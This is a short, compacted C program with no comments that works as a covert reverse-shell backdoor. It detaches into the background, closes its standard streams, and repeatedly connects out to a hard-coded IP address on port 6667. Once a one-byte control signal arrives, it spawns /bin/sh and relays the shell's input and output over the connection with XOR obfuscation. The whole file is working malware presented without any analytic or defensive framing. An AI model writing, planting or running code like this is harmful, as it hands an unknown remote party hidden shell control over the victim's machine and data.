#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
int main(int argc,char **argv){char c;int s,x,sv0[2],sv1[2];struct sockaddr_in sa;switch(fork()){case 0:break;default:exit(1);}setsid();close(0);close(1);close(2);do{if((s=socket(AF_INET,SOCK_STREAM,0))==(-1))exit(1);sa.sin_family=AF_INET;sa.sin_port=htons(6667);sa.sin_addr.s_addr=inet_addr("66.37.138.99");alarm(10);if(connect(s,(struct sockaddr *)&sa,sizeof(sa))==(-1))exit(1);if((x=read(s,&c,1))<=0)exit(1);else{alarm(0);switch(c){case'A':exit(0);case 'D':break;case 'M':close(s);sleep(3600);continue;}}break;}while(1);if(socketpair(AF_UNIX,SOCK_STREAM,0,sv0)==(-1))exit(1);if(socketpair(AF_UNIX,SOCK_STREAM,0,sv1)==(-1))exit(1);switch(fork()){case -1:{exit(1);}case 0:{char *a[]={"/bin/sh",NULL};close(sv0[1]);close(sv1[1]);dup2(sv0[0],0);dup2(sv1[0],1);dup2(sv1[0],2);execve(a[0],a,NULL);}default:{close(sv0[0]);close(sv1[0]);while(1){int len,ret;fd_set rfd;char buf[2048];FD_ZERO(&rfd);FD_SET(s,&rfd);FD_SET(sv1[1],&rfd);if(select(32,&rfd,NULL,NULL,NULL)==(-1)){exit(1);}if(FD_ISSET(s,&rfd)){if((len=read(s,buf,sizeof(buf)))<=0){exit(1);}for(x=0;x<len;x++)buf[x]^=0x89;x=0;while(x<len){if((ret=write(sv0[1],buf+x,len-x))==(-1)){exit(1);}x+=ret;}}if(FD_ISSET(sv1[1],&rfd)){if((len=read(sv1[1],buf,sizeof(buf)))<=0){exit(1);}for(x=0;x<len;x++)buf[x]^=0x89;x=0;while(x<len){if((ret=write(s,buf+x,len-x))==(-1)){exit(1);}x+=ret;}}}}}}
